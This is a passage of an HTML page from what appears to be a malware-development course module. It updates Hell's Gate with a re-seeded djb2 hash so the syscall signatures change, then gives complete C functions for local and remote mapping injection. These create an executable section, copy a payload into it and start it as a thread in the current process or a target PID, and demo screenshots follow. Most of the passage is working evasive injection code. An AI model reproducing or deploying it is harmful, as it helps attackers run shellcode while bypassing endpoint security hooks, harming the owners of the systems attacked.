+        </div><h3 id="updating-seed-value" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating Seed Value</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">DWORD64 djb2(PBYTE str) {
+	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
+	INT c;
+
+	while (c = *str++)
+		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;
+
+	return dwHash;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">printf</code> statements should be added to a new project to generate the djb2 hash values.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateSection&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtMapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtUnmapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtClose&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Once the values are generated, add them to the start of the Hell&#x27;s Gate project.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define NtCreateSection_djb2         0x5687F81AC5D1497A#define NtMapViewOfSection_djb2      0x0778E82F702E79D4#define NtUnmapViewOfSection_djb2    0x0BF2A46A27B93797#define NtClose_djb2                 0x0DA4FA80EF5031E7#define NtCreateThreadEx_djb2        0x2786FB7E75145F1A</code></pre>
+        </div><h3 id="updating-the-main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating The Main Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The main function must be updated to use either the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LocalMappingInjectionViaSyscalls</code> or <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code> functions instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">payload function</a>. The function will use the above-generated hashes as shown below.</p><h3 id="localmappinginjectionviasyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>LocalMappingInjectionViaSyscalls</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+	HANDLE				hSection		= NULL;
+	HANDLE				hThread			= NULL;
+	PVOID				pAddress		= NULL;
+	NTSTATUS			STATUS			= NULL;
+	SIZE_T				sViewSize		= NULL;
+	LARGE_INTEGER		MaximumSize 	= {
+			.HighPart = 0,
+			.LowPart = sPayloadSize
+	};
+
+//--------------------------------------------------------------------------
+	// Allocating local map view
+	HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %ld \n&quot;, pAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+	// Writing the payload
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+
+//--------------------------------------------------------------------------
+
+	// Executing the payload via thread creation
+
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
+	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+
+//--------------------------------------------------------------------------
+
+	// Unmapping the local view - only when the payload is done executing
+	HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	// Closing the section handle
+	HellsGate(pVxTable-&gt;NtClose.wSystemCall);
+	if ((STATUS = HellDescent(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="remotemappinginjectionviasyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>RemoteMappingInjectionViaSyscalls</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+
+	HANDLE				hSection			= NULL;
+	HANDLE				hThread				= NULL;
+	PVOID				pLocalAddress		= NULL,
+					    pRemoteAddress		= NULL;
+	NTSTATUS			STATUS				= NULL;
+	SIZE_T				sViewSize			= NULL;
+	LARGE_INTEGER		MaximumSize 	    = {
+			.HighPart = 0,
+			.LowPart = sPayloadSize
+	};
+
+//--------------------------------------------------------------------------
+	// Allocating local map view
+
+	HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
+		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Writing the payload
+	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
+	getchar();
+	memcpy(pLocalAddress, pPayload, sPayloadSize);
+	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);
+
+//--------------------------------------------------------------------------
+
+	// Allocating remote map view
+	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
+		printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);
+
+//--------------------------------------------------------------------------
+
+	// Executing the payload via thread creation
+	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
+	getchar();
+	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pRemoteAddress);
+	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
+	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+	printf(&quot;[+] DONE \n&quot;);
+	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));
+
+//--------------------------------------------------------------------------
+
+	// Unmapping the local view - only when the payload is done executing
+	HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
+	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
+		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	// Closing the section handle
+	HellsGate(pVxTable-&gt;NtClose.wSystemCall);
+	if ((STATUS = HellDescent(hSection)) != 0) {
+		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="local-vs-remote-injection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Local vs Remote Injection</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Similar to the previous module, a preprocessor macro code was constructed to target the local process if <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LOCAL_INJECTION</code> is defined. The preprocessor code is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define LOCAL_INJECTION#ifndef LOCAL_INJECTION#define REMOTE_INJECTION// Set the target process PID
+#define PROCESS_ID	18784	#endif // !LOCAL_INJECTION</code></pre>
+        </div><h3 id="demo" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using the SysWhispers implementation locally.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscall-mapping-214533288-cc53802f-345d-4eb3-896a-fb4d7dc61b27.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using SysWhispers implementation remotely.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscall-mapping-314533763-efe02370-e08e-4d13-9c4c-884931855bdc.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using Hell&#x27;s Gate implementation locally.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscall-mapping-414534077-da2c3b3e-fcac-4691-9e1e-261b6380e7cb.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using Hell&#x27;s Gate implementation remotely.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscall-mapping-514534407-34d19c71-70d1-4669-99c0-6b3ce6a64d9e.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div></main></body></html>
